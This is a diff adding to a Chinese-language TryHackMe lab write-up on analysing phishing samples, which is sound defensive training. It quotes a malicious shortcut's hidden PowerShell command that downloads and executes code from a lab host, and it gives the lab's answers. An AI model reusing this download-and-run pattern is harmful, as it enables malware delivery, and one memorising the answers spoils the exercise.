@@ -2802,4 +2802,25 @@ Logging Brute Force：
     
     A：`THM{misleading_extension}`
 
-2. 我
+2. 使用 **Phishing Case 2** 資料夾中的檔案。惡意 LNK 是從哪個網址下載惡意軟體的？
+
+    將其壓縮檔先解壓縮：
+    ![image](https://hackmd.io/_uploads/BkGvcPqZze.png)
+    
+    右鍵 **Shortcut** 檔案，查看其內容中的目標欄位：
+    ![image](https://hackmd.io/_uploads/B1zzsP5-fx.png)
+    
+    > 完整 Payload 為：`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -c iex (iwr -UseBasicParsing "http://wp16.hqywlqpa.thm:8000/cgi-bin/f").Content`
+
+    A：`http://wp16.hqywlqpa.thm:8000/cgi-bin/f`
+
+3. 查看 **Phishing Case 3** 資料夾中的內容。雙副檔名的檔名是什麼？
+    
+    ![image](https://hackmd.io/_uploads/HkN3sPcWfx.png)
+    
+    A：`best-cat.jpg.exe`
+    
+---
+
+#### Contiuning Phishing Topic
+
